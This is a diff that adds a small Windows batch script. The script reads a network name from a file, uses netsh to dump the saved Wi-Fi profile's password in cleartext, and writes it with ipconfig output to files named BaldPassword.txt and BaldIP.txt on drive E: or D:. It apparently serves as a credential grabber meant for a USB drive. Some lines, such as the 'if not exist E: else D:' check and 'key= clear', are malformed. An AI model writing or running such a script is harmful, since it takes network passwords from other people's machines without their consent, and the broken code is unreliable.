@@ -1,0 +1,16 @@
+color 2
+
+set /p input=<NetworkName.txt
+
+@echo off 
+	netsh wlan show profile
+	
+	if not exist E: else D:
+	
+ > E:\BaldPassword.txt netsh wlan show profile name=%input% key= clear
+ > D:\BaldPassword.txt netsh wlan show profile name=%input% key= clear
+
+ > E:\BaldIP.txt ipconfig
+ > D:\BaldIP.txt ipconfig
+ 
+exit
